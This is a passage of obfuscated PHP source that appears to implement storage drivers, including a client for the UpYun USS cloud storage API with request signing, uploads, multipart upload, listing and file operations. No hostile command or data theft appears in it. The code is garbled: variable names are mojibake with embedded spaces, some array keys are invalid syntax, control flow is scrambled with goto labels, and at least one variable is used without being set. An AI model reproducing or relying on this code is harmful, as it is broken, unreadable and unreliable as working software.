array($cÂ¹˜¾‹ç‰[1238] => $AÌùõòÏ„æ[1], $cÂ¹˜¾‹ç‰[199] => $cÂ¹˜¾‹ç‰[116], $cÂ¹˜¾‹ç‰[1151] => strlen($eì°à±õ‘Ç)); $cŠÆñ¼Õ˜Ì = $cÂ¹˜¾‹ç‰[212]; $Bæ„Œ–‘‚Š = $cÂ¹˜¾‹ç‰[8] . $this->pathEncode($c„†õ–„ÖŒ) . $Fğá…ãÙØ¸[$cÂ¹˜¾‹ç‰[160]]; goto FÉÎˆÔÕÚ“; D—Óµµ‘™: if (!$d¸¸¥çÈ) { return !1; } $eì°à±õ‘Ç = $cÂ¹˜¾‹ç‰[1241]; foreach ($d¸¸¥çÈ as $fÔ¼‰’ªÈ¹) { $eì°à±õ‘Ç .= $cÂ¹˜¾‹ç‰[1242] . "\x3c\x50\x61\162\x74\116\x75\x6d\x62\x65\x72\x3e{$fÔ¼‰’ªÈ¹[$cÂ¹˜¾‹ç‰[1192]]}\x3c\x2f\x50\141\162\164\116\165\155\142\x65\x72\76\12" . "\74\x45\124\141\x67\x3e{$fÔ¼‰’ªÈ¹[$cÂ¹˜¾‹ç‰[1193]]}\x3c\x2f\x45\124\141\x67\76\xa" . $cÂ¹˜¾‹ç‰[1243]; } goto C Û¼ É‚ğ; C Û¼ É‚ğ: $eì°à±õ‘Ç .= $cÂ¹˜¾‹ç‰[1244]; $aãàŠ´®Ğ– = array(); $AÌùõòÏ„æ = explode($cÂ¹˜¾‹ç‰[171], $this->getHost()); goto dœå°Şğá«; D›Ô„ĞÈã…: } public function link($déÒ‘âä™, $e—ŞÔ¾“ = array()) { return parent::link($déÒ‘âä™, $e—ŞÔ¾“); } public function fileOut($Aø‰ô²áß, $CÇ†ĞÄÇ›Š = false, $d®ôÊ°î÷‘ = false, $d¾ïå¹ÃÇÉ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¦·][1245])) { return parent::fileOutServer($Aø‰ô²áß, $CÇ†ĞÄÇ›Š, $d®ôÊ°î÷‘, $d¾ïå¹ÃÇÉ); } parent::fileOut($Aø‰ô²áß, $CÇ†ĞÄÇ›Š, $d®ôÊ°î÷‘, $d¾ïå¹ÃÇÉ); } public function fileOutImage($cˆ³„ÎÖöñ, $b·‡“¹¢ = 250) { if (strstr($this->endpoint, $_SERVER[¦·][1245])) { return parent::fileOutImageServer($cˆ³„ÎÖöñ, $b·‡“¹¢); } parent::fileOutImage($cˆ³„ÎÖöñ, $b·‡“¹¢); } public function fileOutLink($BÃ”·“äÆ) { $b” Œâƒ’ =& $_SERVER[¦·]; if (substr($BÃ”·“äÆ, 0, 7) == $b” Œâƒ’[1118]) { $BÃ”·“äÆ = $b” Œâƒ’[1119] . substr($BÃ”·“äÆ, 7); } header($b” Œâƒ’[156] . $BÃ”·“äÆ); die; } public function getHost() { $C·Š„¯íÂ‰ =& $_SERVER[¦·]; $a»‘Î¾„ = str_rtrim(parent::getHost(), $C·Š„¯íÂ‰[8] . $this->bucket); $a»‘Î¾„ = explode($C·Š„¯íÂ‰[171], $a»‘Î¾„); return $a»‘Î¾„[0] . $C·Š„¯íÂ‰[171] . $this->bucket . $C·Š„¯íÂ‰[91] . $a»‘Î¾„[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($eÈ¾ô½Ä …, $E™˜¯×ªİ = 0) { parent::__construct(); $this->source = $eÈ¾ô½Ä …; $this->sourceSize = $E™˜¯×ªİ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($dĞâ„Ù­ = false) { return $this->sourceSize; } public function getContent($cêã—ª°åÕ = false) { return $this->fileSubstr($cêã—ª°åÕ, 0, $this->sourceSize); } public function fileSubstr($EÅÍã©Í = false, $CÍ¹ƒÔ¨ˆ = 0, $CÔÄ¹ÛÍ¥ = 0) { if (!$CÔÄ¹ÛÍ¥) { $CÔÄ¹ÛÍ¥ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $CÍ¹ƒÔ¨ˆ, $CÔÄ¹ÛÍ¥); } if ($this->sourceType == self::TYPE_FILE) { if ($CÔÄ¹ÛÍ¥ <= 0) { return $_SERVER[¦·][33]; } $FÊ„Ä„Ãˆá = ftell($this->source); fseek_64($this->source, $FÊ„Ä„Ãˆá + $CÍ¹ƒÔ¨ˆ); $D™­¶·íè = @fread($this->source, $CÔÄ¹ÛÍ¥); fseek_64($this->source, $FÊ„Ä„Ãˆá); return $D™­¶·íè; } } public function hashMd5($eéË¸«¢ÛÄ = false) { return md5($this->getContent()); } public static function hash($bñÛë÷œçƒ, $CáíË†ôí = 0) { $aêœˆ‘¶‘Ç = new PathDriverStream($bñÛë÷œçƒ, $CáíË†ôí); return $aêœˆ‘¶‘Ç->hashSimple($bñÛë÷œçƒ); } public static function md5($AÂœâ¼ß¢©, $Dì¯Å÷‘Å = 0) { $bî™Ë¼òÓ§ = new PathDriverStream($AÂœâ¼ß¢©, $Dì¯Å÷‘Å); return $bî™Ë¼òÓ§->hashMd5($AÂœâ¼ß¢©); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\x3a\57\x2f\x76\x30\x2e\x61\160\151\56\x75\x70\171\x75\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($DÌÊŠÃœ¸©) { parent::__construct(); $this->_init($DÌÊŠÃœ¸©); } public function _init($A‰øôæˆñò) { foreach ($A‰øôæˆñò as $c¤…ßêñ“× => $fØ’¼Èã‹) { if (isset($this->{$c¤…ßêñ“×})) { $this->{$c¤…ßêñ“×} = $fØ’¼Èã‹; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[¦·][1246], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($d¤‹ë‹ÙĞ¢, $aã£äÊšÌè = "\107\x45\x54") { $F„ò‹„Æ¢† =& $_SERVER[¦·]; $CÃ”º‹Š¾º = gmdate($F„ò‹„Æ¢†[1209]); $fÈµ“ŸÏÒ¥ = base64_encode(hash_hmac($F„ò‹„Æ¢†[1247], "{$aã£äÊšÌè}\46{$d¤‹ë‹ÙĞ¢}\x26{$CÃ”º‹Š¾º}", md5("{$this->userpass}"), !0)); $DÊâŠ†É÷‡ = array("\101\165\x74\x68\157\162\151\x7a\141\164\151\x6f\156\72\125\x50\131\125\x4e\x20{$this->username}\x3a{$fÈµ“ŸÏÒ¥}", "\x44\x61\164\145\72{$CÃ”º‹Š¾º}"); return $DÊâŠ†É÷‡; } public function ussRequest($Aã«œÄ³ÜÀ, $f† ÜìÅ›Œ = "\107\105\124", $EÑÉ»¡Ï • = false, $AœÈ…ÔŸ¶ø = false, $eïùš“²¥ = false) { goto a‹Î©¦ìÂš; FÌ™¶ğ™—©: if (!$B´Î¥õÎŸœ) { return array($d´éÄ–Ê»”[1035] => !1, $d´éÄ–Ê»”[1037] => $d´éÄ–Ê»”[1248]); } if (strtolower($f† ÜìÅ›Œ) == $d´éÄ–Ê»”[184] || in_array($B´Î¥õÎŸœ[$d´éÄ–Ê»”[1035]], array($d´éÄ–Ê»”[1103], $d´éÄ–Ê»”[1249]))) { $EÑÉ»¡Ï • = $B´Î¥õÎŸœ[$d´éÄ–Ê»”[1250]]; } else { $EÑÉ»¡Ï • = json_decode($B´Î¥õÎŸœ[$d´éÄ–Ê»”[1037]], !0); if (!$EÑÉ»¡Ï •) { $EÑÉ»¡Ï • = $B´Î¥õÎŸœ[$d´éÄ–Ê»”[1037]]; } else { if (!$B´Î¥õÎŸœ[$d´éÄ–Ê»”[690]] && isset($EÑÉ»¡Ï •[$d´éÄ–Ê»”[1251]])) { $EÑÉ»¡Ï • = $EÑÉ»¡Ï •[$d´éÄ–Ê»”[1251]]; } } } return array($d´éÄ–Ê»”[1035] => $B´Î¥õÎŸœ[$d´éÄ–Ê»”[690]], $d´éÄ–Ê»”[1037] => $EÑÉ»¡Ï •); goto eìôêÜ´ßÌ; a‹Î©¦ìÂš: $d´éÄ–Ê»” =& $_SERVER[¦·]; $Aã«œÄ³ÜÀ = trim($Aã«œÄ³ÜÀ, $d´éÄ–Ê»”[8]); $CË„ßÊ˜ãÕ = "\x2f{$this->bucket}\x2f{$Aã«œÄ³ÜÀ}"; goto f«òõçºÛÇ; f«òõçºÛÇ: $F•Šëšôˆ¿ = $this->ussHeaders($CË„ßÊ˜ãÕ, $f† ÜìÅ›Œ); if ($AœÈ…ÔŸ¶ø) { $F•Šëšôˆ¿ = array_merge($F•Šëšôˆ¿, $AœÈ…ÔŸ¶ø); } $B´Î¥õÎŸœ = url_request($this->endpoint . $CË„ßÊ˜ãÕ, $f† ÜìÅ›Œ, $EÑÉ»¡Ï •, $F•Šëšôˆ¿, $eïùš“²¥); goto FÌ™¶ğ™—©; eìôêÜ´ßÌ: } public function mkfile($f ôæ£šá, $F°ñ˜‡¹æá = '', $E‡ÕÇ˜ÔË = REPEAT_RENAME) { if ($this->setContent($f ôæ£šá, $F°ñ˜‡¹æá)) { return $this->getPathOuter($f ôæ£šá); } return !1; } public function mkdir($fÆ¢ƒÊ²„¶, $bïÆÕœá¥ = REPEAT_SKIP) { $E¤õ‰š„…ä =& $_SERVER[¦·]; $C°­öº¢µ× = trim($fÆ¢ƒÊ²„¶, $E¤õ‰š„…ä[8]); if ($this->_isFolder($C°­öº¢µ×)) { return $this->getPathOuter($C°­öº¢µ×); } $B‚ÍÊƒ¬°– = array($E¤õ‰š„…ä[1252]); $A‰‰±ø´× = $this->ussRequest($C°­öº¢µ×, $E¤õ‰š„…ä[212], !1, $B‚ÍÊƒ¬°–); return $A‰‰±ø´×[$E¤õ‰š„…ä[1035]] ? $this->getPathOuter($C°­öº¢µ×) : !1; } public function copyFile($bÖÖ·ÃÊ‡¬, $aÃè®ğ°ÍÏ) { $F®ÌÔ´¹“Ğ =& $_SERVER[¦·]; $Fù‘ÒŠ¢øÄ = array($F®ÌÔ´¹“Ğ[1253] . "\57{$this->bucket}\57{$bÖÖ·ÃÊ‡¬}", $F®ÌÔ´¹“Ğ[1254]); $f¶¸×Ñ™ÖÛ = $this->ussRequest($aÃè®ğ°ÍÏ, $F®ÌÔ´¹“Ğ[214], !1, $Fù‘ÒŠ¢øÄ); return $f¶¸×Ñ™ÖÛ[$F®ÌÔ´¹“Ğ[1035]] ? !0 : $this->getPathOuter($aÃè®ğ°ÍÏ); } public function moveFile($AÇ£Ş“¡‰„, $bÅá†“‰) { $FÖ˜›êŒ’™ =& $_SERVER[¦·]; $e†¤†‹„…„ = array($FÖ˜›êŒ’™[1255] . "\57{$this->bucket}\x2f{$AÇ£Ş“¡‰„}", $FÖ˜›êŒ’™[1254]); $CÌçêÅÑÅ = $this->ussRequest($bÅá†“‰, $FÖ˜›êŒ’™[214], !1, $e†¤†‹„…„); return $CÌçêÅÑÅ[$FÖ˜›êŒ’™[1035]] ? !0 : $this->getPathOuter($bÅá†“‰); } public function delFile($aø¨‚©¸¯÷) { $eÕÔ§Ö¸ç =& $_SERVER[¦·]; $cæŒ‰ãˆø‰ = $this->ussRequest($aø¨‚©¸¯÷, $eÕÔ§Ö¸ç[1256]); return $cæŒ‰ãˆø‰[$eÕÔ§Ö¸ç[1035]] ? !0 : !1; } public function delFolder($FËËñØÛ¢) { $Dƒ¿ğôÛÑŞ =& $_SERVER[¦·]; $A‡ˆ†§–óø = $this->listAll($FËËñØÛ¢); krsort($A‡ˆ†§–óø); foreach ($A‡ˆ†§–óø as $c²ÉÏÀ Ú¹) { $this->ussRequest($c²ÉÏÀ Ú¹[$Dƒ¿ğôÛÑŞ[75]], $Dƒ¿ğôÛÑŞ[1256]); } return $this->ussRequest($FËËñØÛ¢, $Dƒ¿ğôÛÑŞ[1256]); } public function rename($a—˜¸Œ°Ö¢, $f¡ç‡–ÕÓÆ) { if ($this->isFile($a—˜¸Œ°Ö¢)) { $f¡ç‡–ÕÓÆ = get_path_father($a—˜¸Œ°Ö¢) . $f¡ç‡–ÕÓÆ; return $this->moveFile($a—˜¸Œ°Ö¢, $f¡ç‡–ÕÓÆ); } return $this->renameObject($a—˜¸Œ°Ö¢, $f¡ç‡–ÕÓÆ); } public function fileInfo($DöÇØÜœÉ, $A‰Ì¹‰•˜ª = false, $aŞ¹Ç‹í„™ = array()) { $Dø‘é³ÖÍƒ =& $_SERVER[¦·]; if ($A‰Ì¹‰•˜ª) { return array($Dø‘é³ÖÍƒ[28] => $this->pathThis($DöÇØÜœÉ), $Dø‘é³ÖÍƒ[75] => $this->getPathOuter($Dø‘é³ÖÍƒ[8] . $DöÇØÜœÉ), $Dø‘é³ÖÍƒ[29] => $Dø‘é³ÖÍƒ[167], $Dø‘é³ÖÍƒ[77] => isset($aŞ¹Ç‹í„™[$Dø‘é³ÖÍƒ[325]]) ? $aŞ¹Ç‹í„™[$Dø‘é³ÖÍƒ[325]] : 0, $Dø‘é³ÖÍƒ[160] => $this->ext($DöÇØÜœÉ)); } $DÚ÷¤Ù¬‹ = array($Dø‘é³ÖÍƒ[28] => $this->pathThis($DöÇØÜœÉ), $Dø‘é³ÖÍƒ[75] => $this->getPathOuter($Dø‘é³ÖÍƒ[8] . $DöÇØÜœÉ), $Dø‘é³ÖÍƒ[29] => $Dø‘é³ÖÍƒ[167], $Dø‘é³ÖÍƒ[187] => 0, $Dø‘é³ÖÍƒ[107] => isset($Aá¨Ÿ–¡Ğî[$Dø‘é³ÖÍƒ[1257]]) ? $Aá¨Ÿ–¡Ğî[$Dø‘é³ÖÍƒ[1257]] : 0, $Dø‘é³ÖÍƒ[77] => isset($aŞ¹Ç‹í„™[$Dø‘é³ÖÍƒ[325]]) ? $aŞ¹Ç‹í„™[$Dø‘é³ÖÍƒ[325]] : 0, $Dø‘é³ÖÍƒ[160] => $this->ext($DöÇØÜœÉ), $Dø‘é³ÖÍƒ[188] => !0, $Dø‘é³ÖÍƒ[189] => !0); if (empty($aŞ¹Ç‹í„™)) { $aŞ¹Ç‹í„™ = $this->objectMeta($DöÇØÜœÉ); if (!$aŞ¹Ç‹í„™) { return $DÚ÷¤Ù¬‹; } $DÚ÷¤Ù¬‹[$Dø‘é³ÖÍƒ[187]] = $aŞ¹Ç‹í„™[$Dø‘é³ÖÍƒ[1258]]; $DÚ÷¤Ù¬‹[$Dø‘é³ÖÍƒ[107]] = $aŞ¹Ç‹í„™[$Dø‘é³ÖÍƒ[1259]]; $DÚ÷¤Ù¬‹[$Dø‘é³ÖÍƒ[77]] = $aŞ¹Ç‹í„™[$Dø‘é³ÖÍƒ[77]]; } return $DÚ÷¤Ù¬‹; } public function folderInfo($bß“î®íÉá, $a…ñäˆ¨ß = false) { $f‘œÏÅÚ‚Ù =& $_SERVER[¦·]; if ($a…ñäˆ¨ß) { return array($f‘œÏÅÚ‚Ù[28] => $this->pathThis($bß“î®íÉá), $f‘œÏÅÚ‚Ù[75] => $this->getPathOuter($f‘œÏÅÚ‚Ù[8] . $bß“î®íÉá), $f‘œÏÅÚ‚Ù[29] => $f‘œÏÅÚ‚Ù[76]); } $dÓŠÑ¥ñß = array($f‘œÏÅÚ‚Ù[28] => $this->pathThis($bß“î®íÉá), $f‘œÏÅÚ‚Ù[75] => $this->getPathOuter($f‘œÏÅÚ‚Ù[8] . $bß“î®íÉá), $f‘œÏÅÚ‚Ù[29] => $f‘œÏÅÚ‚Ù[76], $f‘œÏÅÚ‚Ù[187] => 0, $f‘œÏÅÚ‚Ù[107] => isset($FÔÊ¬ ³øá[$f‘œÏÅÚ‚Ù[1257]]) ? $FÔÊ¬ ³øá[$f‘œÏÅÚ‚Ù[1257]] : 0, $f‘œÏÅÚ‚Ù[1167] => !0, $f‘œÏÅÚ‚Ù[1168] => !0); if (empty($d™¼—„Ñç¦)) { $d™¼—„Ñç¦ = $this->objectMeta($bß“î®íÉá); if (!$d™¼—„Ñç¦) { return $dÓŠÑ¥ñß; } $dÓŠÑ¥ñß[$f‘œÏÅÚ‚Ù[187]] = $d™¼—„Ñç¦[$f‘œÏÅÚ‚Ù[1258]]; $dÓŠÑ¥ñß[$f‘œÏÅÚ‚Ù[107]] = $d™¼—„Ñç¦[$f‘œÏÅÚ‚Ù[1259]]; } return $dÓŠÑ¥ñß; } private function fileList($fÎá˜Ô«, $d³çÎ¤Ù›Ó = 0, $fÌÚØ¼Ö‹¦ = 1000) { $cµÉºß£ =& $_SERVER[¦·]; $BÃ¯“Îœ÷ = array($cµÉºß£[1260], $cµÉºß£[1261] . $fÌÚØ¼Ö‹¦); if ($d³çÎ¤Ù›Ó) { $BÃ¯“Îœ÷[] = $cµÉºß£[1262] . $d³çÎ¤Ù›Ó; } $e¹›Ãğ´Â = $this->ussRequest($fÎá˜Ô«, $cµÉºß£[216], !1, $BÃ¯“Îœ÷); return !$e¹›Ãğ´Â[$cµÉºß£[1035]] ? !1 : $e¹›Ãğ´Â[$cµÉºß£[1037]]; } public function listPath($DùÒªËµ§¨, $eŠÅ…ËÚàÛ = false) { goto cøÆÒ¼ÂÙ; Cö¼ä³ôÂ£: $BŸ´İ¡é©´ = $EÛÊ‘Í…ùö = array(); $E½¾Ã‚‰ = rtrim($DùÒªËµ§¨, $C²·ò¤¿é½[8]) . $C²·ò¤¿é½[8]; while (!0) { $d²ø÷ = $this->fileList($DùÒªËµ§¨, $C†Ä™ÃÚÏ§, $BÕŒ™•»¶®); if (!$d²ø÷) { return !1; } $C†Ä™ÃÚÏ§ = isset($d²ø÷[$C²·ò¤¿é½[1263]]) ? $d²ø÷[$C²·ò¤¿é½[1263]] : $C²·ò¤¿é½[33]; $dÍ†•âñ‹è = isset($d²ø÷[$C²·ò¤¿é½[1264]]) ? $d²ø÷[$C²·ò¤¿é½[1264]] : array(); foreach ($dÍ†•âñ‹è as $Fï½İŒÉ ª) { if ($Fï½İŒÉ ª[$C²·ò¤¿é½[29]] == $C²·ò¤¿é½[76]) { $BŸ´İ¡é©´[] = $this->folderInfo($E½¾Ã‚‰ . $Fï½İŒÉ ª[$C²·ò¤¿é½[28]], $eŠÅ…ËÚàÛ, $Fï½İŒÉ ª); } else { $EÛÊ‘Í…ùö[] = $this->fileInfo($E½¾Ã‚‰ . $Fï½İŒÉ ª[$C²·ò¤¿é½[28]], $eŠÅ…ËÚàÛ, $Fï½İŒÉ ª); } } if (count($dÍ†•âñ‹è) < $BÕŒ™•»¶®) { break; } } goto Bó±³¨Ã; cøÆÒ¼ÂÙ: $C²·ò¤¿é½ =& $_SERVER[¦·]; $C†Ä™ÃÚÏ§ = $C²·ò¤¿é½[33]; $BÕŒ™•»¶® = 1000; goto Cö¼ä³ôÂ£; Bó±³¨Ã: return array($C²·ò¤¿é½[74] => $BŸ´İ¡é©´, $C²·ò¤¿é½[73] => $EÛÊ‘Í…ùö); goto E¥¹àîÑĞ¨; E¥¹àîÑĞ¨: } private function recursionAllFiles($D½·´Ù‰ˆ, &$C§ƒÕ©ïßÀ) { $A Ë¾ï÷ê– =& $_SERVER[¦·]; $f˜±–¨®¡ì = $A Ë¾ï÷ê–[33]; $EğÀ¨œÜ¢° = 1000; $e²¦ÊÌø = $DµÅÌÒ“ó = array(); $C°ˆ¹È«Àï = rtrim($D½·´Ù‰ˆ, $A Ë¾ï÷ê–[8]) . $A Ë¾ï÷ê–[8]; while (!0) { $bƒ¥È’Š = $this->fileList($D½·´Ù‰ˆ, $f˜±–¨®¡ì, $EğÀ¨œÜ¢°); if (!$bƒ¥È’Š) { return !1; } $f˜±–¨®¡ì = isset($bƒ¥È’Š[$A Ë¾ï÷ê–[1263]]) ? $bƒ¥È’Š[$A Ë¾ï÷ê–[1263]] : $A Ë¾ï÷ê–[33]; $AŠïÉÀÆ‚í = isset($bƒ¥È’Š[$A Ë¾ï÷ê–[1264]]) ? $bƒ¥È’Š[$A Ë¾ï÷ê–[1264]] : array(); foreach ($AŠïÉÀÆ‚í as $fÛô®ã¸Ä) { $A²õÛ‡Ú¯‚ = array($A Ë¾ï÷ê–[75] => $C°ˆ¹È«Àï . $fÛô®ã¸Ä[$A Ë¾ï÷ê–[28]], $A Ë¾ï÷ê–[76] => $fÛô®ã¸Ä[$A Ë¾ï÷ê–[29]] == $A Ë¾ï÷ê–[76] ? 1 : 0, $A Ë¾ï÷ê–[77] => isset($fÛô®ã¸Ä[$A Ë¾ï÷ê–[325]]) ? $fÛô®ã¸Ä[$A Ë¾ï÷ê–[325]] : 0); $C§ƒÕ©ïßÀ[] = $A²õÛ‡Ú¯‚; if ($A²õÛ‡Ú¯‚[$A Ë¾ï÷ê–[76]] == 1) { $this->recursionAllFiles($A²õÛ‡Ú¯‚[$A Ë¾ï÷ê–[75]], $C§ƒÕ©ïßÀ); } } if (count($AŠïÉÀÆ‚í) < $EğÀ¨œÜ¢°) { break; } } } public function has($E‚­è­, $DöÄî˜öÏÆ = false, $aÎº…°µñÌ = true) { goto CÀ•Ç†ê‹™; CÀ•Ç†ê‹™: $C«Üšá»£Ç =& $_SERVER[¦·]; $EàÇ©¾ó = $C«Üšá»£Ç[33]; $e¤ŞÜ›ãÓª = 1000; goto DßÅæ¾Ê¯ª; DßÅæ¾Ê¯ª: $cñ¤ÒŠ„µ = 0; $Aäõ£èù½å = 0; $f¶í³º¿¸Î = rtrim($E‚­è­, $C«Üšá»£Ç[8]) . $C«Üšá»£Ç[8]; goto bÛöì’‡Õ®; bÛöì’‡Õ®: while (!0) { $b«ÎÇ‹åà  = $this->fileList($E‚­è­, $EàÇ©¾ó, $e¤ŞÜ›ãÓª); if (!$b«ÎÇ‹åà ) { return !1; } $EàÇ©¾ó = isset($b«ÎÇ‹åà [$C«Üšá»£Ç[1263]]) ? $b«ÎÇ‹åà [$C«Üšá»£Ç[1263]] : $C«Üšá»£Ç[33]; $E©ÏÌÍî±Ô = isset($b«ÎÇ‹åà [$C«Üšá»£Ç[1264]]) ? $b«ÎÇ‹åà [$C«Üšá»£Ç[1264]] : array(); if (empty($E©ÏÌÍî±Ô)) { break; } $Cœóõö¸ = array_to_keyvalue($E©ÏÌÍî±Ô, $C«Üšá»£Ç[33], $C«Üšá»£Ç[29]); $cò±æç¶¡­ = array_count_values($Cœóõö¸); $Bõ³¨Ò¿ÎÕ = isset($cò±æç¶¡­[$C«Üšá»£Ç[76]]) ? $cò±æç¶¡­[$C«Üšá»£Ç[76]] : 0; $fôíâªÌ = count($Cœóõö¸) - $Bõ³¨Ò¿ÎÕ; if ($DöÄî˜öÏÆ) { $Aäõ£èù½å += $Bõ³¨Ò¿ÎÕ; $cñ¤ÒŠ„µ += $fôíâªÌ; if ($F·ŸÎí—Ñ  < $e¤ŞÜ›ãÓª) { break; } continue; } if ($aÎº…°µñÌ) { if ($fôíâªÌ) { return !0; } } else { if ($Bõ³¨Ò¿ÎÕ) { return !0; } } if (count($E©ÏÌÍî±Ô) < $e¤ŞÜ›ãÓª) { break; } } if ($DöÄî˜öÏÆ) { return array($C«Üšá»£Ç[191] => $cñ¤ÒŠ„µ, $C«Üšá»£Ç[192] => $Aäõ£èù½å); } return !1; goto D“•› ßãã; D“•› ßãã: } public function listAll($dóä»ÖÊŒª) { $e¾ê“ÛÖÕ‡ = array(); $this->recursionAllFiles($dóä»ÖÊŒª, $e¾ê“ÛÖÕ‡); return $e¾ê“ÛÖÕ‡; } public function canRead($d¾‘÷ëÍêÜ) { return $this->exist($d¾‘÷ëÍêÜ) ? !0 : !1; } public function canWrite($EÍäêóÅ‡Û) { return $this->exist($EÍäêóÅ‡Û) ? !0 : !1; } public function getContent($dÃŠ¤ˆ¥ç¢) { return $this->fileSubstr($dÃŠ¤ˆ¥ç¢, 0, -1); } public function setContent($cõø‘¦Èèë, $d‰Üª±ì‰ß = '') { $fºÓÕ³šÁå =& $_SERVER[¦·]; if (!$d‰Üª±ì‰ß) { $DäÊÎöôÚ÷ = $this->ussRequest($cõø‘¦Èèë, $fºÓÕ³šÁå[212]); return $DäÊÎöôÚ÷[$fºÓÕ³šÁå[1035]]; } $DŸ¥‹Âè‚ = $this->tempFile($this->pathThis($cõø‘¦Èèë)); file_put_contents($DŸ¥‹Âè‚, $d‰Üª±ì‰ß); if ($this->upload($cõø‘¦Èèë, $DŸ¥‹Âè‚)) { $this->tempFileRemve($DŸ¥‹Âè‚); return !0; } return !1; } public function fileSubstr($AíŒâ»àõ‰, $F‹Ó’—©‚¼, $F°ßâõƒ©¸) { $dŠ’«ˆÓ–§ =& $_SERVER[¦·]; if (!($eÖŒ¼ĞË = $this->link($AíŒâ»àõ‰))) { return !1; } $cÕÛ’áå¢ = !1; if ($F°ßâõƒ©¸ > 0) { $BËÒÑó†°ï = $F‹Ó’—©‚¼ + $F°ßâõƒ©¸ - 1; $cÕÛ’áå¢ = array($dŠ’«ˆÓ–§[1224] . $F‹Ó’—©‚¼ . $dŠ’«ˆÓ–§[412] . $BËÒÑó†°ï); } $f²•ñ„—»ª = url_request($eÖŒ¼ĞË, $dŠ’«ˆÓ–§[216], !1, $cÕÛ’áå¢); return $f²•ñ„—»ª[$dŠ’«ˆÓ–§[690]] ? $f²•ñ„—»ª[$dŠ’«ˆÓ–§[1037]] : !1; } public function upload($AÆ©ÇÒ½ğ, $C‹®È«, $dœóâ©‰àÁ = false, $E×®ÜÔ¬÷® = REPEAT_REPLACE) { goto aò©ßÏŒ‚; C¹¢Ï³´—: if (!$dšîŞä©…‹[$d„µÇİß”õ[1035]]) { return !1; } $fèĞ”—ÆÀ¯ = $dšîŞä©…‹[$d„µÇİß”õ[1037]]; $EÜŸµ“ ¬² = 0; goto bÑÑÛŒ¿Ç; aò©ßÏŒ‚: $d„µÇİß”õ =& $_SERVER[¦·]; $céƒêÛ®” = IO::size($C‹®È«); if ($céƒêÛ®” <= 1024 * 1024 * 200) { $Eîàã±å = array($d„µÇİß”õ[1265] . $C‹®È«); $dšîŞä©…‹ = $this->ussRequest($AÆ©ÇÒ½ğ, $d„µÇİß”õ[214], $Eîàã±å); return $dšîŞä©…‹[$d„µÇİß”õ[1035]] ? $this->getPathOuter($AÆ©ÇÒ½ğ) : !1; } goto bù·­à®œ; bù·­à®œ: $dÈµ›–‡×¯ = 1024 * 1024 * 10; $EÓƒöóŒ¨ = array($d„µÇİß”õ[1266], $d„µÇİß”õ[1267] . $céƒêÛ®”, $d„µÇİß”õ[1268], $d„µÇİß”õ[1269] . $dÈµ›–‡×¯); $dšîŞä©…‹ = $this->ussRequest($AÆ©ÇÒ½ğ, $d„µÇİß”õ[214], !1, $EÓƒöóŒ¨); goto C¹¢Ï³´—; C‘ª¸‚ˆ¢: $dšîŞä©…‹ = $this->ussRequest($AÆ©ÇÒ½ğ, $d„µÇİß”õ[214], !1, $EÓƒöóŒ¨); return $dšîŞä©…‹[$d„µÇİß”õ[1035]] ? $this->getPathOuter($dœšÄµ‚¨¿) : !1; goto C˜Ü’µÓº; bÑÑÛŒ¿Ç: $BŠ‡¢³°Ù¶ = $fèĞ”—ÆÀ¯[$d„µÇİß”õ[1270]]; $C§åÒªÓŞ¤ = fopen($C‹®È«, $d„µÇİß”õ[1174]); if (!$C§åÒªÓŞ¤) { return !1; } goto D¬©ïì¿ô; D¬©ïì¿ô: do { $eÈ½Æ¾Ç›È = $fèĞ”—ÆÀ¯[$d„µÇİß”õ[1271]]; fseek_64($C§åÒªÓŞ¤, $EÜŸµ“ ¬²); $B¬½Ù‚‹¦› = fread($C§åÒªÓŞ¤, $eÈ½Æ¾Ç›È); $Aµ¸µ½î°™ = 0; do { $Aµ¸µ½î°™++; $fèĞ”—ÆÀ¯ = $this->uploadPart($AÆ©ÇÒ½ğ, $fèĞ”—ÆÀ¯, $B¬½Ù‚‹¦›); } while (!$fèĞ”—ÆÀ¯ && $Aµ¸µ½î°™ < 3); if (!$fèĞ”—ÆÀ¯) { return !1; } $BŠ‡¢³°Ù¶ = $fèĞ”—ÆÀ¯[$d„µÇİß”õ[1270]]; $EÜŸµ“ ¬² += $eÈ½Æ¾Ç›È; } while ($BŠ‡¢³°Ù¶ != -1); fclose($C§åÒªÓŞ¤); $EÓƒöóŒ¨ = array($d„µÇİß”õ[1272], $d„µÇİß”õ[1273] . $fèĞ”—ÆÀ¯[$d„µÇİß”õ[1274]], $d„µÇİß”õ[1268]); goto C‘ª¸‚ˆ¢; C˜Ü’µÓº: } private function uploadPart($DßÎƒÔŞÏ•, $f‘ç†½‹ë, &$A‡Æö”‘­) { $Eˆàœ÷Ä‘Õ =& $_SERVER[¦·]; $E¹á†›À  = array($Eˆàœ÷Ä‘Õ[1275], $Eˆàœ÷Ä‘Õ[1273] . $f‘ç†½‹ë[$Eˆàœ÷Ä‘Õ[1274]], $Eˆàœ÷Ä‘Õ[1276] . $f‘ç†½‹ë[$Eˆàœ÷Ä‘Õ[1270]], $Eˆàœ÷Ä‘Õ[138] . $f‘ç†½‹ë[$Eˆàœ÷Ä‘Õ[1271]]); $bğ…šäòšª = $this->ussRequest($DßÎƒÔŞÏ•, $Eˆàœ÷Ä‘Õ[214], $A‡Æö”‘­, $E¹á†›À ); return !$bğ…šäòšª[$Eˆàœ÷Ä‘Õ[1035]] ? $bğ…šäòšª[$Eˆàœ÷Ä‘Õ[1035]] : $bğ…šäòšª[$Eˆàœ÷Ä‘Õ[1037]]; } public function uploadFormData($D÷¤×Äôõ, $fëí±ÄÌ  = 3600) { return $this->uploadPolicy($D÷¤×Äôõ, $fëí±ÄÌ ); } public function multiUploadFormData($cÇ©¡ÚäÂ, $dÎß·À¾²ï = 3600) { $c·Š—’äÃ… =& $_SERVER[¦·]; 